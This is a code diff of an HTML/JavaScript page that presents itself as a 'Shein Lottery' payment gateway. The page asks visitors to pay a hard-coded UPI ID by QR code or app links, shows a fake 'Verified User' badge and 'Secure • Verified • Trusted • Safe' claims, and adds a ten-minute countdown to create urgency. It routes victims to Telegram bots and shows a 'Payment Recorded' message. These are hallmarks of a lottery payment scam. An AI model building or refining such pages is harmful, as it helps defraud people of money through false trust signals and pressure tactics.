@@ -3,359 +3,684 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Payment Request - Shein Lottery</title>
+  <title>Shein Lottery Payment Gateway</title>
   <style>
+    /* =============== GLOBAL STYLES =============== */
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
     }
+
     body {
-      background: #f5f7fa;
+      background: linear-gradient(135deg, #f5f7fa, #e4edf9);
+      color: #333;
       padding: 20px;
-      max-width: 500px;
+      max-width: 520px;
       margin: 0 auto;
+      position: relative;
     }
-    .header {
+
+    /* =============== TOP BAR WITH DATE/TIME =============== */
+    .top-bar {
       display: flex;
+      justify-content: space-between;
       align-items: center;
-      gap: 12px;
+      margin-bottom: 20px;
+      padding: 10px 15px;
       background: #1976d2;
       color: white;
-      padding: 15px 20px;
+      border-radius: 12px;
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    .date-time {
+      font-family: monospace;
+    }
+
+    /* =============== MAIN HEADER - HORIZONTAL NAME =============== */
+    .header {
+      background: #1976d2;
+      color: white;
+      padding: 20px;
       border-top-left-radius: 12px;
       border-top-right-radius: 12px;
       position: relative;
+      text-align: center;
     }
+
     .logo {
-      width: 40px;
-      height: 40px;
+      width: 50px;
+      height: 50px;
       background: white;
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
-      font-size: 24px;
+      font-size: 26px;
       font-weight: bold;
       color: #1976d2;
+      margin: 0 auto 12px;
     }
+
     .company-name {
-      font-size: 16px;
+      font-size: 22px;
+      font-weight: bold;
+      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+      /* Removed vertical writing */
+    }
+
+    .verified-section {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+      margin-top: 10px;
+      font-size: 14px;
       font-weight: bold;
     }
+
     .verified-badge {
       display: inline-flex;
       align-items: center;
-      gap: 4px;
-      background: rgba(0, 200, 83, 0.2);
+      gap: 6px;
+      background: rgba(0, 200, 83, 0.25);
       color: #00c853;
-      padding: 2px 8px;
-      border-radius: 12px;
-      font-size: 12px;
-      margin-left: 8px;
+      padding: 5px 14px;
+      border-radius: 20px;
+      border: 1px solid rgba(0, 200, 83, 0.4);
     }
+
     .verified-badge::before {
       content: "✓";
-      font-size: 12px;
+      font-size: 18px;
     }
+
+    .timer-container {
+      margin-top: 12px;
+      background: rgba(255, 255, 255, 0.2);
+      color: white;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 14px;
+      font-weight: bold;
+      display: inline-block;
+    }
+
+    /* =============== AMOUNT SECTION =============== */
     .amount-section {
-      padding: 20px;
+      padding: 24px;
       background: white;
-      border: 1px solid #e0e0e0;
+      border: 1px solid #d0d9e6;
       text-align: center;
+      margin-top: 10px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.06);
     }
+
     .amount-title {
-      font-size: 16px;
-      margin-bottom: 10px;
-      color: #333;
+      font-size: 18px;
+      margin-bottom: 16px;
+      color: #1976d2;
+      font-weight: 600;
     }
+
+    .amount-input-container {
+      position: relative;
+      margin: 0 auto 16px;
+      max-width: 300px;
+    }
+
     .amount-input {
       width: 100%;
-      padding: 12px;
-      font-size: 20px;
-      text-align: center;
-      border: 2px solid #1976d2;
-      border-radius: 8px;
-      margin: 10px 0;
-      font-weight: bold;
-    }
-    .amount-display {
+      padding: 16px 16px 16px 50px;
       font-size: 24px;
-      color: #1976d2;
-      margin: 15px 0;
+      text-align: left;
+      border: 2px solid #1976d2;
+      border-radius: 12px;
+      margin: 0;
       font-weight: bold;
-      display: none;
+      outline: none;
+      background: #f9fbfd;
     }
+
+    .rupee-symbol {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 22px;
+      color: #1976d2;
+      font-weight: bold;
+    }
+
     .btn-done {
       background: #1976d2;
       color: white;
-      padding: 10px;
+      padding: 13px 24px;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
       font-weight: bold;
-      width: 100%;
-      margin: 10px 0;
+      font-size: 17px;
+      transition: all 0.3s;
+      margin-top: 8px;
     }
-    .payment-options {
-      padding: 20px;
-      background: white;
-      border: 1px solid #e0e0e0;
+
+    .error-message {
+      color: #d32f2f;
+      font-size: 15px;
       margin-top: 10px;
+      font-weight: bold;
+      display: none;
     }
+
+    /* =============== PAYMENT OPTIONS =============== */
+    .payment-options {
+      padding: 24px;
+      background: white;
+      border: 1px solid #d0d9e6;
+      margin-top: 15px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.06);
+    }
+
     .section-title {
-      font-size: 16px;
-      margin-bottom: 15px;
-      color: #333;
+      font-size: 18px;
+      margin-bottom: 18px;
+      color: #1976d2;
       text-align: center;
+      font-weight: 600;
     }
+
     .qr-section {
       text-align: center;
-      margin: 20px 0;
+      margin: 24px 0;
     }
+
     .qr-title {
       color: #1976d2;
-      margin-bottom: 10px;
+      margin-bottom: 14px;
+      font-size: 17px;
     }
+
     #qrImage {
-      width: 280px;
-      height: 280px;
+      width: 290px;
+      height: 290px;
       object-fit: contain;
       background: white;
-      padding: 10px;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      margin: 10px 0;
+      padding: 14px;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.15);
+      margin: 14px 0;
     }
+
     .download-btn {
       background: #1976d2;
       color: white;
-      padding: 10px;
+      padding: 13px 24px;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
       font-weight: bold;
-      width: 100%;
-      margin: 10px 0;
+      font-size: 17px;
+      transition: all 0.3s;
+      margin: 14px 0;
     }
+
     .apps-grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
-      gap: 10px;
-      margin: 20px 0;
+      gap: 14px;
+      margin: 24px 0;
     }
+
     .app-btn {
-      padding: 12px;
+      padding: 16px 10px;
       background: white;
-      border: 1px solid #ddd;
-      border-radius: 8px;
+      border: 1px solid #e0e6ef;
+      border-radius: 14px;
       text-align: center;
       cursor: pointer;
-      transition: all 0.2s;
+      transition: all 0.25s;
+      box-shadow: 0 3px 8px rgba(0,0,0,0.1);
     }
-    .app-btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-    }
+
     .app-logo {
-      width: 40px;
-      height: 40px;
-      margin: 0 auto 8px;
+      width: 52px;
+      height: 52px;
+      margin: 0 auto 12px;
+      display: block;
     }
+
     .app-name {
-      font-size: 12px;
+      font-size: 14px;
+      font-weight: bold;
+      color: #333;
+    }
+
+    .upi-text-section {
+      background: #f0f7ff;
+      padding: 18px;
+      border-radius: 12px;
+      margin: 22px 0;
+      border: 1px dashed #1976d2;
+    }
+
+    .upi-instruction {
+      font-size: 16px;
+      color: #1976d2;
+      margin-bottom: 12px;
+      font-weight: 600;
+    }
+
+    .upi-id-container {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      background: white;
+      padding: 12px 16px;
+      border-radius: 12px;
+      font-family: monospace;
+      font-weight: bold;
+      color: #0d47a1;
+      border: 1px solid #bbdefb;
+    }
+
+    .copy-btn {
+      background: #1976d2;
+      color: white;
+      border: none;
+      padding: 8px 16px;
+      border-radius: 10px;
+      cursor: pointer;
+      font-size: 13px;
       font-weight: bold;
     }
+
     .instruction {
-      padding: 15px;
+      padding: 20px;
       background: #fffde7;
       border: 1px solid #ffeb3b;
-      border-radius: 8px;
-      margin: 20px 0;
-      font-size: 14px;
-      line-height: 1.5;
-      text-align: center;
-    }
-    .footer {
-      padding: 15px;
-      background: #f5f5f5;
-      text-align: center;
-      font-size: 12px;
-      color: #666;
-      border-top: 1px solid #ddd;
-    }
-    .timer {
-      position: absolute;
-      top: 15px;
-      right: 20px;
-      background: rgba(255, 255, 255, 0.2);
-      color: white;
-      padding: 4px 10px;
       border-radius: 12px;
-      font-size: 12px;
+      margin: 24px 0;
+      font-size: 15px;
+      line-height: 1.6;
+      text-align: center;
+      color: #5d4037;
+    }
+
+    .paid-btn {
+      background: #ff9800;
+      color: white;
+      padding: 13px 24px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 17px;
+      transition: all 0.3s;
+      margin: 14px 0;
+    }
+
+    .reward-box, .fail-box {
+      display: none;
+      padding: 22px;
+      border-radius: 12px;
+      margin: 22px 0;
+      text-align: center;
+      font-size: 19px;
       font-weight: bold;
     }
-    .expired-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.8);
-      color: white;
-      display: none;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      z-index: 999;
-      font-size: 20px;
-      text-align: center;
-      padding: 20px;
+
+    .reward-box {
+      background: #d1fae5;
+      border: 1px solid #059669;
+      color: #059669;
     }
-    .expired-overlay h2 {
-      color: #ff6b6b;
-      margin-bottom: 10px;
+
+    .fail-box {
+      background: #fee2e2;
+      border: 1px solid #dc2626;
+      color: #dc2626;
     }
-    .support-btn {
+
+    .support-btn, .back-btn, .history-btn {
       background: #4caf50;
       color: white;
-      padding: 10px;
+      padding: 13px 24px;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
       font-weight: bold;
+      font-size: 17px;
+      transition: all 0.3s;
+      margin: 14px 0;
       width: 100%;
-      margin: 10px 0;
     }
-    .back-btn {
-      background: #9c27b0;
-      color: white;
-      padding: 10px;
-      border: none;
-      border-radius: 8px;
-      cursor: pointer;
-      font-weight: bold;
+
+    .back-btn { background: #9c27b0; }
+    .back-btn:hover { background: #7b1fa2; }
+
+    .history-btn { background: #2196f3; }
+    .history-btn:hover { background: #1976d2; }
+
+    /* =============== MODAL =============== */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
       width: 100%;
-      margin: 10px 0;
+      height: 100%;
+      background-color: rgba(0,0,0,0.7);
+    }
+
+    .modal-content {
+      background-color: white;
+      margin: 5% auto;
+      padding: 25px;
+      border-radius: 14px;
+      width: 90%;
+      max-width: 480px;
+      max-height: 80vh;
+      overflow-y: auto;
+    }
+
+    .close {
+      color: #aaa;
+      float: right;
+      font-size: 28px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .unauthorized {
+      color: #d32f2f;
+      font-size: 20px;
+      font-weight: bold;
+      text-align: center;
+      padding: 30px 0;
+    }
+
+    .history-item {
+      padding: 12px;
+      border-bottom: 1px solid #eee;
+    }
+
+    .history-amount {
+      font-weight: bold;
+      color: #1976d2;
+    }
+
+    .footer {
+      padding: 20px;
+      background: #f5f5f5;
+      text-align: center;
+      font-size: 13px;
+      color: #555;
+      border-top: 1px solid #ddd;
+      margin-top: 20px;
+      border-radius: 12px;
+    }
+
+    .footer strong {
+      color: #1976d2;
     }
   </style>
 </head>
 <body>
 
+  <!-- Top Bar -->
+  <div class="top-bar">
+    <div>Shein Lottery Payment</div>
+    <div class="date-time" id="dateTime"></div>
+  </div>
+
   <!-- Header -->
   <div class="header">
     <div class="logo">P</div>
-    <div class="company-name">PRIYANKA GUPTA</div>
-    <div class="verified-badge">Verified User</div>
-    <div class="timer" id="countdown">⏳ 10:00</div>
+    <div class="company-name">PRIYANKA GUPTA</div> <!-- FIXED: Now horizontal -->
+    <div class="verified-section">
+      <div class="verified-badge">Verified User</div>
+    </div>
+    <div class="timer-container">
+      <span id="countdown">⏳ 10:00</span>
+    </div>
   </div>
 
   <!-- Amount Section -->
   <div class="amount-section">
     <div class="amount-title">Payment Request From SHEIN LOTTERY TICKET</div>
-    <input type="number" class="amount-input" id="amountInput" placeholder="Enter Amount To Pay" min="1" step="1">
-    <button class="btn-done" onclick="setAmount()">Done</button>
+    <div class="amount-input-container">
+      <span class="rupee-symbol">₹</span>
+      <input 
+        type="number" 
+        class="amount-input" 
+        id="amountInput" 
+        placeholder="0"
+        min="1" 
+        max="5000" 
+        step="1"
+      >
+    </div>
+    <button class="btn-done" onclick="setAmount()">Confirm Amount</button>
+    <div class="error-message" id="errorMessage"></div>
     <div class="amount-display" id="amountDisplay">You Have To Pay ₹<span id="displayAmount">0</span></div>
   </div>
 
   <!-- Payment Options -->
   <div class="payment-options">
     <div class="section-title">Pay By Given Below Options</div>
+
     <div class="qr-section">
       <div class="qr-title">Scan QR And Pay</div>
       <img src="qr.jpg" id="qrImage" alt="Payment QR">
-      <button class="download-btn" onclick="downloadQR()">💾 Save QR</button>
+      <button class="download-btn" onclick="downloadQR()">💾 Save QR for Offline Use</button>
     </div>
 
     <div class="apps-grid">
-      <a href="upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=100&cu=INR" class="app-btn" id="phonepeBtn">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/PhonePe_Logo.svg" class="app-logo" alt="PhonePe">
+      <div class="app-btn" onclick="openApp('phonepe')">
+        <img src="phonepe.png" class="app-logo" alt="PhonePe">
         <div class="app-name">PhonePe</div>
-      </a>
-      <a href="upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=100&cu=INR" class="app-btn" id="gpayBtn">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Google_Pay_Logo.svg" class="app-logo" alt="Google Pay">
+      </div>
+      <div class="app-btn" onclick="openApp('gpay')">
+        <img src="googlepay.png" class="app-logo" alt="Google Pay">
         <div class="app-name">Google Pay</div>
-      </a>
-      <a href="upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=100&cu=INR" class="app-btn" id="paytmBtn">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/5/55/Paytm_Logo.svg" class="app-logo" alt="Paytm">
+      </div>
+      <div class="app-btn" onclick="openApp('paytm')">
+        <img src="paytm.png" class="app-logo" alt="Paytm">
         <div class="app-name">Paytm</div>
-      </a>
+      </div>
+    </div>
+
+    <div class="upi-text-section">
+      <div class="upi-instruction">If above failed, try this UPI ID:</div>
+      <div class="upi-id-container">
+        <span id="upiText">techydev1720@ybl</span>
+        <button class="copy-btn" onclick="copyUPI()">Copy</button>
+      </div>
     </div>
 
     <div class="instruction">
-      READ CAREFULLY: AFTER SUCCESSFUL PAYMENT GO BACK TO YOUR BOT AND CLICK "I HAVE PAID" AND SEND PAYMENT SCREENSHOT TO GET YOUR TICKETS
+      READ CAREFULLY: AFTER SUCCESSFUL PAYMENT GO BACK TO YOUR BOT AND CLICK<br>
+      <strong>"I HAVE PAID"</strong><br>
+      AND SEND PAYMENT SCREENSHOT TO GET YOUR TICKETS
+    </div>
+
+    <button class="paid-btn" onclick="markAsPaid()">✅ I HAVE PAID</button>
+
+    <!-- HISTORY BUTTON -->
+    <button class="history-btn" onclick="showHistory()">📜 View Payment History</button>
+
+    <div class="reward-box" id="rewardBox">
+      🎉 Payment Recorded!<br>Your ticket will be issued shortly.
+    </div>
+    <div class="fail-box" id="failBox">
+      ❌ PAYMENT NOT FOUND<br>If you paid, please contact support with screenshot.
     </div>
 
     <button class="support-btn" onclick="openSupport()">💬 CONTACT SUPPORT</button>
     <button class="back-btn" onclick="goBackToBot()">🔙 GO BACK TO BOT</button>
   </div>
 
-  <!-- Footer -->
-  <div class="footer">
-    © 2026 Shein Lottery Ticket System<br>
-    Secure • Verified • Trusted • Safe
+  <!-- History Modal -->
+  <div id="historyModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeHistory()">&times;</span>
+      <div id="historyContent">
+        <!-- Will be filled by JS -->
+      </div>
+    </div>
   </div>
 
-  <!-- Expired Overlay -->
-  <div class="expired-overlay" id="expiredOverlay">
-    <h2>⏰ PAYMENT EXPIRED</h2>
-    <p>IF ANY QUERY OR PAYMENT RELATED ISSUE, CONTACT SUPPORT</p>
-    <button class="support-btn" onclick="openSupport()">💬 CONTACT SUPPORT</button>
+  <div class="footer">
+    © 2026 Shein Lottery Ticket System<br>
+    <strong>Secure • Verified • Trusted • Safe</strong>
   </div>
 
   <script>
-    // Set amount and update QR links
+    // ==================== CONFIG ====================
+    // 🔑 Set to true ONLY if you are admin (edit this before deploying)
+    const IS_ADMIN = false; // ← CHANGE THIS TO true IF YOU ARE ADMIN
+
+    // ==================== DATE & TIME ====================
+    function updateDateTime() {
+      const now = new Date();
+      let hours = now.getHours();
+      const minutes = String(now.getMinutes()).padStart(2, '0');
+      const seconds = String(now.getSeconds()).padStart(2, '0');
+      const ampm = hours >= 12 ? 'PM' : 'AM';
+      hours = hours % 12 || 12;
+      document.getElementById('dateTime').textContent = `${hours}:${minutes}:${seconds} ${ampm}`;
+    }
+    setInterval(updateDateTime, 1000);
+    updateDateTime();
+
+    // ==================== AMOUNT VALIDATION ====================
+    let currentAmount = null;
+
     function setAmount() {
-      const amount = document.getElementById('amountInput').value;
-      if (!amount || amount <= 0) {
-        alert("Please enter a valid amount");
+      const amount = parseFloat(document.getElementById('amountInput').value);
+      const errorEl = document.getElementById('errorMessage');
+      errorEl.style.display = 'none';
+
+      if (!amount || isNaN(amount) || amount < 1 || amount > 5000) {
+        errorEl.textContent = "INVALID AMOUNT, TRY AGAIN";
+        errorEl.style.display = 'block';
+        currentAmount = null;
+        document.getElementById('amountDisplay').style.display = 'none';
         return;
       }
 
+      currentAmount = amount;
       document.getElementById('displayAmount').textContent = amount;
       document.getElementById('amountDisplay').style.display = 'block';
 
-      // Update all UPI links with amount
-      const encodedAmount = encodeURIComponent(amount);
-      document.getElementById('phonepeBtn').href = `upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=${encodedAmount}&cu=INR`;
-      document.getElementById('gpayBtn').href = `upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=${encodedAmount}&cu=INR`;
-      document.getElementById('paytmBtn').href = `upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=${encodedAmount}&cu=INR`;
+      const encoded = encodeURIComponent(amount);
+      window.phonepeLink = `upi://pay?pa=techydev1720%40ybl&pn=Shein%20Lottery&am=${encoded}&cu=INR`;
+      window.gpayLink = window.phonepeLink;
+      window.paytmLink = window.phonepeLink;
     }
 
-    // Download QR
+    // ==================== PAYMENT FUNCTIONS ====================
+    function openApp(app) {
+      if (!currentAmount) return alert("Please enter amount first!");
+      window.location.href = window[`${app}Link`];
+    }
+
+    function copyUPI() {
+      navigator.clipboard.writeText("techydev1720@ybl").then(() => {
+        const btn = event.target;
+        const orig = btn.textContent;
+        btn.textContent = "Copied!";
+        setTimeout(() => btn.textContent = orig, 2000);
+      });
+    }
+
     function downloadQR() {
-      const link = document.createElement('a');
-      link.href = 'qr.jpg';
-      link.download = 'Shein_Lottery_Payment_QR.jpg';
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
+      const a = document.createElement('a');
+      a.href = 'qr.jpg';
+      a.download = 'Shein_Lottery_Payment_QR.jpg';
+      a.click();
     }
 
-    // Open Telegram Support
+    function markAsPaid() {
+      if (!currentAmount) return alert("Please enter amount first!");
+      
+      const payment = {
+        amount: currentAmount,
+        upi: "techydev1720@ybl",
+        timestamp: new Date().toISOString()
+      };
+
+      let hist = JSON.parse(localStorage.getItem('shein_payment_history') || '[]');
+      hist.push(payment);
+      localStorage.setItem('shein_payment_history', JSON.stringify(hist));
+
+      document.getElementById('rewardBox').style.display = 'block';
+      document.getElementById('failBox').style.display = 'none';
+    }
+
+    // ==================== ADMIN-ONLY HISTORY ====================
+    function showHistory() {
+      const content = document.getElementById('historyContent');
+
+      if (!IS_ADMIN) {
+        content.innerHTML = `<div class="unauthorized">❌ UNAUTHORIZED USER</div>`;
+        document.getElementById('historyModal').style.display = 'block';
+        return;
+      }
+
+      const hist = JSON.parse(localStorage.getItem('shein_payment_history') || '[]');
+      if (hist.length === 0) {
+        content.innerHTML = '<h3 style="color:#1976d2;">Payment History</h3><p>No payments recorded.</p>';
+      } else {
+        let html = '<h3 style="color:#1976d2;">Payment History</h3>';
+        hist.forEach(item => {
+          const date = new Date(item.timestamp).toLocaleString('en-IN', {
+            day: '2-digit', month: 'short', year: 'numeric',
+            hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
+          });
+          html += `<div class="history-item">₹<span class="history-amount">${item.amount}</span><br><small>${date}</small></div>`;
+        });
+        content.innerHTML = html;
+      }
+
+      document.getElementById('historyModal').style.display = 'block';
+    }
+
+    function closeHistory() {
+      document.getElementById('historyModal').style.display = 'none';
+    }
+
+    window.onclick = (e) => {
+      if (e.target === document.getElementById('historyModal')) closeHistory();
+    };
+
+    // ==================== TELEGRAM ====================
     function openSupport() {
       window.open('https://t.me/contact_admin17_bot', '_blank');
     }
 
-    // Go Back to Bot
     function goBackToBot() {
       window.open('https://t.me/shein_lottery_ticket_bot', '_blank');
     }
 
-    // 10-minute timer
-    let timeLeft = 10 * 60; // 600 seconds
+    // ==================== TIMER ====================
+    let timeLeft = 600;
     const countdownEl = document.getElementById('countdown');
-    const expiredOverlay = document.getElementById('expiredOverlay');
-
     const timer = setInterval(() => {
       if (timeLeft <= 0) {
         clearInterval(timer);
         countdownEl.textContent = "EXPIRED";
-        expiredOverlay.style.display = 'flex';
+        countdownEl.style.background = "rgba(220, 38, 38, 0.3)";
         return;
       }
-
       const mins = Math.floor(timeLeft / 60).toString().padStart(2, '0');
       const secs = (timeLeft % 60).toString().padStart(2, '0');
       countdownEl.textContent = `⏳ ${mins}:${secs}`;
@@ -364,4 +689,4 @@
   </script>
 
 </body>
-</html>
+      </html>
